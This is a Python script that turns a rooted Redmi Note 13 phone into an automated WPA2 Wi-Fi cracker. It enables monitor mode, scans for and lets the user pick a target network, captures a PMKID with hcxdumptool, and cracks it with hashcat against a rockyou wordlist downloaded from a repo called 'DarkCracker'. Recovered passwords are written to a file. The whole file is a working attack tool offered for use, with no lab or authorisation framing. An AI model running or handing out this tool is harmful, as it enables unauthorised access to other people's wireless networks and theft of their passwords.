#!/usr/bin/env python3
# main.py - REDMI NOTE 13 QUALCOMM v5.15.148 OPTIMIZED
# NO USB ADAPTER • Magisk Root • Monitor Mode Native
import subprocess, time, argparse, os, re, signal
from pathlib import Path
import threading

class RedmiWiFiCracker:
    def __init__(self):
        self.script_dir = Path(__file__).parent.absolute()
        self.wordlist = self.setup_wordlist()
        self.potfile = self.script_dir / "hashcat.potfile"
        self.iface = self.detect_iface()
        
    def detect_iface(self):
        """Auto detect Redmi WiFi interface"""
        result = subprocess.run("iwconfig", capture_output=True, text=True, shell=True)
        ifaces = re.findall(r'^(\w+)', result.stdout, re.MULTILINE)
        
        for iface in ifaces:
            if 'wlan' in iface or 'wlp' in iface:
                print(f"✅ Detected: {iface}")
                return iface
        print("❌ No WiFi interface!")
        exit(1)
    
    def setup_wordlist(self):
        """Indo wordlist optimized"""
        wl = self.script_dir / "rockyou.txt"
        if not wl.exists():
            print("📥 Downloading optimized wordlist...")
            url = "https://raw.githubusercontent.com/OverH4shX/DarkCracker/main/rockyou.txt"
            os.system(f"curl -L -o {wl} '{url}'")
        return str(wl)
    
    def root_monitor_mode(self):
        """Qualcomm kernel 5.15 + Magisk monitor mode"""
        print(f"[+] Enabling monitor: {self.iface}")
        
        # Method 1: iwconfig (standard)
        subprocess.run(f"su -c 'iwconfig {self.iface} mode monitor'", shell=True)
        
        # Method 2: Qualcomm sysfs (Redmi specific)
        try:
            subprocess.run("su -c 'echo 1 > /sys/kernel/debug/ieee80211/phy0/monitor'", shell=True)
        except:
            pass
        
        # Method 3: ip link (modern)
        subprocess.run(f"su -c 'ip link set {self.iface} up'", shell=True)
        
        time.sleep(2)
        result = subprocess.run(f"iwconfig {self.iface}", shell=True, capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            print("✅ MONITOR MODE ACTIVE!")
            return True
        else:
            print("❌ Monitor failed! Install Magisk module")
            return False
    
    def quick_scan(self, duration=20):
        """Optimized airodump-ng scan"""
        print(f"[+] Scanning {duration}s...")
        scan_file = "redmi_scan"
        
        cmd = f"airodump-ng {self.iface} -w {scan_file} --output-format csv --write-interval 10"
        proc = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
        
        def timeout_kill():
            time.sleep(duration)
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        
        scan_thread = threading.Thread(target=timeout_kill)
        scan_thread.start()
        scan_thread.join()
        
        print("📡 Check redmi_scan-01.csv")
    
    def select_target(self):
        """Interactive BSSID/Channel selector"""
        print("\n🎯 TARGET SELECTION:")
        with open("redmi_scan-01.csv", 'r') as f:
            lines = f.readlines()
        
        aps = []
        for line in lines[2:]:  # Skip header
            parts = [p.strip() for p in line.split(',')]
            if len(parts) > 13 and parts[13] == 'WPA2':  # WPA2 only
                bssid = parts[0]
                essid = parts[-1].replace('"', '')
                channel = parts[3]
                if essid and essid != '<length 0>':
                    aps.append((bssid, channel, essid))
                    print(f"{len(aps)}. {essid} | {bssid} | CH{channel}")
        
        choice = int(input("Pilih target (1-{}): ".format(len(aps))) or 1) - 1
        return aps[choice]
    
    def pmkid_attack(self, bssid, channel, duration=120):
        """HCXDUMPTool optimized"""
        pcap = f"capture_{bssid.replace(':','_')}.pcapng"
        print(f"\n🔥 PMKID: {bssid} CH{channel} ({duration}s)")
        
        cmd = f"""su -c "
        hcxdumptool -i {self.iface} \\
        --pmkid --enable_status=1 \\
        --channel={channel} \\
        --bssid={bssid} \\
        --active_beacon_timeout=10 \\
        -o {pcap}
        " &"""
        
        os.system(cmd)
        time.sleep(duration)
        os.system("su -c 'pkill -f hcxdumptool'")
        return pcap
    
    def extract_hash(self, pcap):
        """Hash extraction"""
        hc22000 = pcap.replace('.pcapng', '.hc22000')
        subprocess.run(f"hcxpcapngtool -o {hc22000} {pcap}", shell=True)
        
        if os.path.exists(hc22000) and os.path.getsize(hc22000) > 100:
            print(f"✅ Hash extracted: {hc22000}")
            return hc22000
        return None
    
    def hashcat_crack(self, hash_file):
        """Optimized hashcat for Redmi"""
        print(f"\n⚡ CRACKING: {hash_file}")
        print(f"📖 Wordlist: {self.wordlist}")
        
        # Qualcomm CPU + GPU optimized
        cmd = f"""hashcat -m 22000 '{hash_file}' '{self.wordlist}' \\
        --force \\
        --optimized-kernel-enable \\
        --status \\
        --status-timer=15 \\
        -w 3 -O"""
        
        result = subprocess.run(cmd, shell=True)
        return result.returncode == 0
    
    def read_cracked_password(self):
        """Extract password from potfile"""
        if not self.potfile.exists():
            return None
        
        with open(self.potfile, 'r') as f:
            lines = f.readlines()
        
        for line in lines[-10:]:
            match = re.match(r'^([*:a-f0-9]+):(.+)$', line.strip())
            if match:
                pwd = match.group(2)
                print(f"\n🎉 PASSWORD: '{pwd}'")
                with open("cracked.txt", "a") as out:
                    out.write(f"{pwd}\n")
                return pwd
        return None
    
    def cleanup(self):
        """Restore normal mode"""
        print("\n🧹 Cleanup...")
        subprocess.run(f"su -c 'iwconfig {self.iface} mode managed'", shell=True)
        subprocess.run(f"su -c 'killall wpa_supplicant dhclient'", shell=True)
        print("✅ Network restored")

def main():
    parser = argparse.ArgumentParser(description="🔥 REDMI NOTE 13 WiFi Cracker")
    parser.add_argument("--iface", default="wlan0", help="WiFi interface")
    parser.add_argument("--duration", type=int, default=120, help="PMKID time")
    args = parser.parse_args()
    
    cracker = RedmiWiFiCracker()
    
    try:
        if not cracker.root_monitor_mode():
            print("❌ Install Magisk WiFi Monitor module!")
            exit(1)
        
        cracker.quick_scan()
        bssid, channel, essid = cracker.select_target()
        
        print(f"\n🎯 Attacking: {essid}")
        pcap = cracker.pmkid_attack(bssid, channel, args.duration)
        hash_file = cracker.extract_hash(pcap)
        
        if hash_file:
            cracker.hashcat_crack(hash_file)
            cracker.read_cracked_password()
        else:
            print("❌ No PMKID captured. Try longer duration.")
            
    except KeyboardInterrupt:
        print("\n⚠️ Stopped by user")
    finally:
        cracker.cleanup()

if __name__ == "__main__":
    print("🚀 REDMI NOTE 13 QUALCOMM CRACKER")
    print("Root + Magisk required!")
    main()